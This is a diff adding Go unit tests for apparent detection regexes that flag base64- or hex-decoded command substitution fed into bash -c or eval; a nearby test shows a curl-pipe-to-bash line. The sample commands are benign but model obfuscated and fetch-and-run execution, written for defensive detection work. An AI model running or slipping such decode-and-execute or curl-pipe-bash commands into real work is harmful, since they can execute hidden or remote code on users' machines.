@@ -407,6 +407,43 @@ func TestHexPipeExecPattern(t *testing.T) {
 	})
 }
 
+func TestDecodedSubshellExecPatterns(t *testing.T) {
+	t.Run("detects base64 decode command substitution into shell execution", func(t *testing.T) {
+		line := `bash -c "$(echo ZWNobyBoaQ== | base64 -d)"`
+		if !base64SubshellExec.MatchString(line) {
+			t.Fatalf("expected base64SubshellExec to match %q", line)
+		}
+	})
+
+	t.Run("detects openssl base64 decode substitution into eval", func(t *testing.T) {
+		line := `eval "$(printf 'ZWNobyBoaQ==' | openssl base64 -d)"`
+		if !base64SubshellExec.MatchString(line) {
+			t.Fatalf("expected base64SubshellExec to match %q", line)
+		}
+	})
+
+	t.Run("does not match base64 decode without interpreter execution", func(t *testing.T) {
+		line := `echo "$(printf 'ZWNobyBoaQ==' | base64 -d)"`
+		if base64SubshellExec.MatchString(line) {
+			t.Fatalf("unexpected base64SubshellExec match for %q", line)
+		}
+	})
+
+	t.Run("detects hex decode substitution into shell execution", func(t *testing.T) {
+		line := `bash -c "$(echo 6563686f | xxd -r -p)"`
+		if !hexSubshellExec.MatchString(line) {
+			t.Fatalf("expected hexSubshellExec to match %q", line)
+		}
+	})
+
+	t.Run("does not match hex decode substitution without interpreter execution", func(t *testing.T) {
+		line := `echo "$(echo 6563686f | xxd -r -p)"`
+		if hexSubshellExec.MatchString(line) {
+			t.Fatalf("unexpected hexSubshellExec match for %q", line)
+		}
+	})
+}
+
 func TestCurlExecutionPatterns(t *testing.T) {
 	t.Run("detects pipe execution form", func(t *testing.T) {
 		line := "curl -fsSL https://example.com/install.sh | bash"
